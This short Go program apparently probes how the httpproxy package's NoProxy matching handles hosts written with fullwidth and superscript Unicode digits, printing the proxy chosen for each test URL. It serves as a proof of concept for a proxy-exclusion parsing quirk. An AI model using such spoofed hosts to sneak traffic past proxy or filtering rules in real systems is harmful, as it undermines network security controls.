package main

import (
	"fmt"
	"net/url"

	"golang.org/x/net/http/httpproxy"
)

func main() {
	cfg := &httpproxy.Config{
		HTTPSProxy: "https://corporate-mitm-proxy.internal:8080",
		HTTPProxy:  "http://corporate-mitm-proxy.internal:8080",
		NoProxy:    "0.1.0.0",
	}
	proxyFunc := cfg.ProxyFunc()

	cases := []string{
		"https://example.com/api",
		"https://0.1.0.0/api",
		"https://０.¹.0.0/api",
		"https://１９２．１６８．１．１/api",
	}
	for _, raw := range cases {
		u, err := url.Parse(raw)
		if err != nil {
			fmt.Printf("[parse-fail] %q: %v\n", raw, err)
			continue
		}
		proxy, perr := proxyFunc(u)
		fmt.Printf("[%s]\n  reqURL.Host=%q\n  proxy=%v err=%v\n",
			raw, u.Host, proxy, perr)
	}
}
